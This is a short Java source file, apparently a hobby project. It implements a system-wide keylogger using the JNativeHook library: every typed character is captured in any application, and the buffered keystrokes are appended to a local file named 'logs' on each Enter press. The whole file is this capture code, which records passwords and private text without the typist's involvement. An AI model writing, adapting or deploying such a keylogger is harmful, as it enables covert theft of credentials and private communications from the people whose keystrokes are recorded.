package pl.krzywda;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.lang.annotation.Native;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class KeyCatcher implements NativeKeyListener {
    private String buffer = "";


    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        int v = nativeKeyEvent.getRawCode();
        System.out.println(v);
        if(v == 220){
            System.exit(0);
        }
        if(v == 13){
            this.writeToFile();
        }
        char c;
        if ((nativeKeyEvent.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
            c = KeyEvent.getKeyText(v).charAt(0);
            c = Character.toUpperCase(c);
        } else {
            c = KeyEvent.getKeyText(v).charAt(0);
            c = Character.toLowerCase(c);
        }
        this.buffer += c;
    }

    private String getBuffer() {
        return buffer;
    }

    private void reset(){
        this.buffer = "";
    }

    private void writeToFile(){
        try {
            PrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter("logs", true)));
            System.out.println(getBuffer());
            writer.println(this.getBuffer());
            this.reset();
            writer.close();
        }catch (Exception e){
            e.getMessage();
        }
    }
}
